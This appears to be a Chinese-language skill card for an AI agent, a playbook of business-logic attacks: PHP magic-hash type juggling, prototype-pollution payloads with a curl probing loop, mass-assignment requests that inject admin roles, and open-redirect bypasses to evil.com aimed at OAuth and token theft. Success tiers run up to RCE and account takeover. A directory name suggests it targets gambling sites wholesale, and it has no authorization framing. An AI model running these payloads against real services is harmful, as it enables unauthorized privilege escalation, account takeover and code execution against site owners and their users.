---
name: web-logic-bypass-family
description: "业务逻辑漏洞测试时使用。触发: 类型混淆, 原型链污染, Mass Assignment, 开放重定向。"
version: 1.0.0
license: MIT

---

# 业务逻辑漏洞家族(PHP类型混淆/原型链污染/Mass Assignment/开放重定向)

## When to Use

遇到正文顶部触发指纹/关键词时使用本技能(吸收自测绘引擎知识包)。完整卡全文: 镜像 `D:\博彩通杀\技能库\测绘引擎知识包\.cursor\skills\<原名>\SKILL.md`。


来源: 测绘引擎知识包吸收。镜像卡:
- `...\type-juggling\SKILL.md`(311 行)
- `...\prototype-pollution\SKILL.md`(265 行)
- `...\mass-assignment\SKILL.md`(289 行)
- `...\open-redirect-chain\SKILL.md`(250 行)

## 1. PHP 类型混淆(Type Juggling)
**弱比较 `==`**: 字符串 vs 数字时字符串转数字。
- `"0e123" == 0` → true(科学计数 0×10^123=0);`"abc" == 0` → true(PHP7 前)
- `"1e3" == "1000"` → true

**Magic Hash(`0e…` 全数字)**: `0e` 开头字符串转 0
| 算法 | 例子 |
|---|---|
| MD5 | `240610708` → `0e462097431906509019562988736854` |
| MD5 | `QNKCDZO` → `0e830400451993494058024219903391` |
| SHA1 | `10932435112` → `0e07766915004133176347055865026311692244` |
```php
if (md5($_GET['token']) == '<REDACTED>') // bypass
if (md5($a) == md5($b)) // 用 magic hash 对
```

**HMAC/签名绕过**: `if ($sig == "0")` → 传空/0;数值消息 + `0e` digest。

**PHP 版本差异**: PHP8 字符串与数字比较规则更严(`"abc"==0` false),但 `0e` magic hash 仍适用。代码 `hash_equals`/`===` 则此路不通(转其他面)。

## 2. 原型链污染(Prototype Pollution)
**客户端**: JSON merge → `{"__proto__":{"isAdmin":true}}` → DOM XSS / 属性覆盖。
**服务端 Node.js**:
```javascript
// lodash.merge <= 4.17.11 (CVE-2019-10744)
_.merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
_.set({}, '__proto__.isAdmin', true);
_.defaultsDeep({}, JSON.parse('{"constructor":{"prototype":{"isAdmin":true}}}'));
// deepmerge <= 3.3.0 同
```
```bash
# 探测向量
for p in '{"__proto__":{"isAdmin":true}}' '{"constructor":{"prototype":{"isAdmin":true}}}' \
         '{"__proto__":{"admin":1,"role":"admin"}}'; do
  curl -s "https://target/api/user/update" -H "Content-Type: application/json" \
    -H "Authorization: Bearer <token>" -d "$p"; echo; done
```
**升级链**: PP → 权限绕过(admin/role)、PP → RCE(AST Injection: child_process)、PP → SSRF、模板引擎注入。Gadget 枚举见镜像 §6。

## 3. Mass Assignment(批量赋值)
**原理**: 框架把请求体全字段绑定到模型 → 注入未预期字段。
```bash
# 注册注入特权字段
curl -s -X POST "https://target/api/register" -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"Pass1234!","role":"admin"}'
# 变体: isAdmin:true, verified:true, balance:999999, plan:"enterprise"
```
**字段发现**(关键前置): API 文档/Swagger;GET 响应全字段;前端 JS `fields: [...]`/`.serialize()`;注册→查自己的 GET 看额外字段。
**框架特定**(见镜像 §3):
| 框架 | 要点 |
|---|---|
| FastAPI/Django | pydantic/drf 用 `exclude` 列表 → 漏字段可注入 |
| Laravel | `$fillable`/`$guarded` 配置;`Model::create($request->all())` 高危 |
| Rails | `strong_parameters` 白名单外字段 |
| Express | 直接 `body` 存库 → 全量 |

## 4. 开放重定向链(Open Redirect → 升级)
- **发现参数**: `?next=` `?redirect=` `?url=` `?return=` `?goto=` `?target=` `?dest=` `?r=`
- **绕过白名单**:
  - 双斜杠: `//evil.com`;协议混淆 `https://evil.com` 伪装 `https://<EMAIL-REDACTED>`
  - 白名单前后缀: `evil.com`(子域)、`target.com.evil.com`、`target.com%2eevil.com`
  - 参数污染: `?next=target.com&next=evil.com`(取后)
- **升级**: OAuth 状态绕过(redirect_uri)、SSRF(`http://127.0.0.1`)、token 泄露(redirect 带 token 到攻击域)
- **场景**: 登录后跳转、登出跳转、邮箱确认、密码重置、第三方代理
- 批量发现: 参数字典 + grep 302 的 Location

## 成功口径
| 档 | 条件 |
|---|---|
| L1 | 确认存在(类型混淆分支可控制/magic hash 可触发/PP 属性污染/重定向可控) |
| L2 | 提权(role/admin)或重定向链成立 |
| L3 | RCE/SSRF/ATO 完成 |

## Pitfalls
- Type juggling 先确认 PHP 版本(7 vs 8 行为差异)与 `==` vs `===`
- PP 服务端需确认用递归 merge 的库;Express 直接赋值不中招
- Mass Assignment 先做字段发现再打,盲注 role 字段常无效
- Open Redirect 单独 L1 不算高危,必须演示升级链(OAuth 绕过/token 泄露)才上报
